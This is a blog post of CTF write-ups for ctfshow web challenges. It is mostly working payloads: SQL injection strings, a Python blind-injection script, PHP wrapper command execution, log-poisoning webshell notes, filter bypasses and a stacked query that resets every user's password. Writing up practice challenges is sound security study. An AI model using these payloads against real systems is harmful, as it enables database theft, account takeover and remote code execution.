<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>ctfshow练习 |  b1xcy&#39;s blog</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-ctfshow练习"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  ctfshow练习
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/02/27/ctfshow%E7%BB%83%E4%B9%A0/" class="article-date">
  <time datetime="2024-02-26T16:00:00.000Z" itemprop="datePublished">2024-02-27</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/ctf/">ctf</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">21.1k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">105 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304072204882.png" alt="image-20230407220424812"></p>
<p>base64</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>是sql注入，但是没有回显，搞得挺恶心的，上sqlmap不知道为啥跑不出来</p>
<p>这个报错是没有一点显示的，搞得最开始我都没弄清单双引号</p>
<p>但本质上还是个简单的sql注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; or 1=1 #&amp;password=a</span><br></pre></td></tr></table></figure>

<p>有显示</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304072227003.png" alt="image-20230407222706982"></p>
<p>order by 查到是3，联合注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; union select 1,database(),3#&amp;password=a</span><br></pre></td></tr></table></figure>

<p>要注意的是，这里的回显位是2，必须把要查的东西放在第二位</p>
<p>显示<code>web2</code></p>
<p>爆库爆表爆值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;web2&quot;#&amp;password=a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;flag&quot;#&amp;password=a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=a&#x27; union select 1,group_concat(flag),3 from web2.flag#&amp;password=a</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>有提示</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304121531657.png" alt="image-20230412153140585"></p>
<p>那就是伪协议文件包含了，而且没有什么过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=data://text/plain,&lt;?=`cat ctf_go_go_go`;?&gt;</span><br></pre></td></tr></table></figure>

<p>显示出flag</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include($_GET[&#x27;url&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>文件包含考虑php伪协议，但是传值之后发现error报错，看了wp才知道又是日志包含</p>
<p>（看了一眼过滤php和data）</p>
<p>改个UA再发包，写个一句话木马连蚁剑</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(isset($v1) &amp;&amp; isset($v2))&#123;</span><br><span class="line">            if(!ctype_alpha($v1))&#123;</span><br><span class="line">                die(&quot;v1 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(!is_numeric($v2))&#123;</span><br><span class="line">                die(&quot;v2 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(md5($v1)==md5($v2))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>ctype_alpha()判断是否全字母，is_numeric()判断是否全数字，简单的md5绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=240610708</span><br></pre></td></tr></table></figure>

<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>唉，没有一点提示，过滤了or和空格。还把报错关了。试了一下才知道有三列，回显位在2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,2,3#</span><br></pre></td></tr></table></figure>

<p>然后就是最傻逼的拼命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;web2&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=2&amp;username=-1&#x27;union/**/select/**/1,group_concat(flag),3/**/from/**/web2.flag#</span><br></pre></td></tr></table></figure>

<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>一样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,2,3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,database(),group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,database(),group_concat(flag)/**/from/**/web.flag#</span><br></pre></td></tr></table></figure>

<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>用<code>-1/**/or/**/1=1/**/order/**/by/**/3</code>测出来有三段</p>
<p>但是禁用了union关键字，那就只能用盲注了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://e3406b2c-d1a2-4d95-9939-2b3b5e00d525.challenge.ctf.show/&#x27;</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1, 80):</span><br><span class="line">    for j in range(32, 128):</span><br><span class="line">        payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot; % (</span><br><span class="line">        str(i), str(j))</span><br><span class="line">        test = s.get(url = url + &#x27;?id=0/**/or/**/&#x27; + payload).text</span><br><span class="line">        if &#x27;I asked nothing&#x27; in test:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot; % (</span><br><span class="line">        str(i), str(j))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br></pre></td></tr></table></figure>

<p>唉，phpmyadmin真是傻逼，乱切换数据库。跑测试的时候弄了好久，还得是Navicat</p>
<p>NP，启动！</p>
<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>呃呃，脑残是不。啥提示没有，试了个<code>ffifdyop</code>给我弹flag了，也不提示我md5</p>
<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>点击取消弹出来个index.phps，打开查看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里直接用的strlen来判断，那么双写就绕过不了了。还把union select禁用了，那quine注入也用不了</p>
<p>本来是想着使用堆叠注入。在后面堆叠插入一条新的数据。但由于使用的是mysqli_query函数，更没法堆叠注入。<code>堆叠注入要求使用mysqli_multi_query函数</code>，只有这个函数能一次性执行多条语句</p>
<p>看似是没什么思路了，看了一下别人的wp才知道还有一种方法也能构造出多一条数据</p>
<blockquote>
<p>GROUP BY 会根据每条password的值进行判断。如果结合SUM等函数，就可以做到让password相同的值所对应的其他列内容进行SUM等操作</p>
<p>至于 WITH ROLLUP，它是一种用于在 GROUP BY 子句中添加汇总行的选项。它会在结果中添加一个额外的行，该行包含了所有分组的聚合结果。同上，如果进行了SUM操作，就会把所有的值都SUM起来</p>
</blockquote>
<p>例:</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309220951780.png" alt="image-20230922095013228"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `password`,SUM(`username`) FROM users GROUP BY `password`</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309220957193.png" alt="image-20230922095727165"></p>
<p>而如果加上rollup，就会多处一列，再次进行SUM的汇总操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309220958495.png" alt="image-20230922095822472"></p>
<p>而此时，password这一栏会显示NULL</p>
<p>这个题就是利用了这个点，产生了一条password&#x3D;Null的数据。而这时在POST中传入null就可echo出flag</p>
<blockquote>
<p>再补充一下堆叠注入的办法吧，虽然在这题用不了，但谁知道以后呢。只适用于mysqli_multi_query</p>
<p>使用多条sql语句，并用;分割执行。本质上是堆叠+二次注入</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;1;;INSERT INTO `user`.`users` (`password`, `username`) VALUES (&#x27;test&#x27;, &#x27;test&#x27;);;UPDATE users SET password = &#x27;done&#x27;;UPDATE users SET username = &#x27;done&#x27;;</span><br></pre></td></tr></table></figure>

<p>这样一来就把所有的用户名和对应的密码都设置为done了</p>
</blockquote>
<h2 id="wb11"><a href="#wb11" class="headerlink" title="wb11"></a>wb11</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这题也是出的云里雾里的，跟数据库一点关系没有</p>
<p>$password实际上是get传参进来的，和session[‘password’]进行比较</p>
<p>如果两个都为空即可绕过</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309221311017.png" alt="image-20230922131119973"></p>
<p>删掉password的赋值和Cookie</p>
<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>F12给出hit:?cmd&#x3D;</p>
<p>尝试多次之后发现传入phpinfo();可以成功回显，思路就是直接查文件。但是一看phpinfo里能用的函数基本全给我ban了，直接用命令的方法也不会是很ok</p>
<p>这时候就要想到php原生类了。结合我之前做的笔记，直接Globlterator+SplFileObject开查</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$context = new SplFileObject(&#x27;/var/www/html/903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#x27;);foreach($context as $f)&#123;</span><br><span class="line">echo($f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>唉，看了别的师傅wp，还有更简单的函数highlight_file，直接秒了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h2><p>给cmd随便穿了个东西就弹出源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">            $cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">            if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123;</span><br><span class="line">            </span><br><span class="line">                die(&quot;cerror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(preg_match(&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;,$cmd))&#123;</span><br><span class="line">                die(&quot;serror&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            eval($cmd);</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">     ?&gt;</span><br></pre></td></tr></table></figure>

<p>可见，能用的有 p &#x3D; + ; . ? &lt; &gt; &#96; \</p>
<p>想不明白直接找资料</p>
<blockquote>
<p>php的上传接受multipart&#x2F;form-data，然后会将它保存在临时文件中。php.ini中设置的<code>upload_tmp_dir</code>就是这个临时文件的保存目录。linux下默认为<code>/tmp</code>。也就是说，只要是php接收到上传的POST请求，就会保存一个临时文件，如何这个php脚本具有“上传功能”那么它将拷贝走，无论如何当脚本执行结束这个临时文件都会被删除。另外，这个php临时文件在linux系统下的命名规则永远是<code>phpXXXXXX</code></p>
</blockquote>
<p>基本思路就是上传，然后用eval+&#96;+?+.去模糊匹配执行（.&#x3D;source，source一个文件相当于把每行的命令依次执行一次）</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309222041842.png" alt="image-20230922204150800"></p>
<p>那就是要先完成文件上传，直接让chatgpt给就行</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>文件上传示例<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fileInput&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;.jpg, .jpeg, .png, .gif&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;uploadFile()&quot;</span>&gt;</span>上传文件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;response&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">uploadFile</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileInput&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> responseDiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;response&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (fileInput.<span class="property">files</span>.<span class="property">length</span> === <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&#x27;请选择一个文件&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> file = fileInput.<span class="property">files</span>[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span></span><br><span class="line"><span class="language-javascript">        formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span>, file);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://your-upload-url.com&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: formData</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件上传失败&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这时候直接向&#x2F;index.php?cmd&#x3D;?&gt;&lt;?&#x3D;`.+&#x2F;??p&#x2F;p?p??????`;上传test.txt，内容是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/bash</span><br><span class="line">cat /flag.txt</span><br></pre></td></tr></table></figure>

<p>就可以弹出flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309222118039.png" alt="image-20230922211835007"></p>
<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>唉，也是脑残。源码在upload.php.bak</p>
